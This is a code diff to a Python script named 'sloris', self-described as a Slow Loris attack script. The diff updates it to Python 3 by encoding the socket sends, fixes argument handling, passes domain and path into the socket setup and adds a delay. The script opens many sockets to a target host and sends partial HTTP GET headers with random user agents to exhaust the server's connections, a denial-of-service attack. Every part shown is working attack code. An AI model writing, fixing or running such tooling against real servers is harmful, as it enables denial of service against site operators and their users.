@@ -3,6 +3,7 @@ import sys
 import argparse
 import random
 import re
+from time import sleep
 
 #arg parse stuff
 argparser = argparse.ArgumentParser(prog="sloris", description="Slow Loris Attack Script")
@@ -51,32 +52,33 @@ def sockInit(domain, extension):
 
         #because of the splitting the extension will always be there
         #first line of the get request
-        sock.send("GET {} HTTP/1.1\r\n".format(extension))
+        sock.send("GET {} HTTP/1.1\r\n".format(extension).encode("UTF-8"))
 
         #the host line
-        sock.send("Host: {}\r\n".format(domain))
+        sock.send("Host: {}\r\n".format(domain).encode("UTF-8"))
 
         #the user agent line
         #picks a random user agent and then puts it in
-        sock.send("User-Agent: {}\r\n".format(random_line("useragents")))
+        sock.send("User-Agent: {}\r\n".format(random_line("useragents")).encode("UTF-8"))
             
         #accepted langs line
-        sock.send("Accept-language: en-US, en\r\n")
+        sock.send("Accept-language: en-US, en\r\n".encode("UTF-8"))
 
 #the part that does the actual logic except the arg stuff
 def main():
     #matches the entire string for after the / in the domain
-    extension = re.search(r"\/(.+)?", parser.domain)
+    extension = re.search(r"\/(.+)?", parser.domain[0])
     
     if not extension:
         extension = "/"
 
     #deletes the extension and then leaves the domain
-    domain = parser.domain.replace(extension, "")
+    domain = parser.domain[0].replace(extension, "")
 
     for i in range(parser.socket):
         print("socket #{}".format(i))
-        sockInit()
+        sockInit(domain, extension)
+        sleep(1)
 
 main()
 
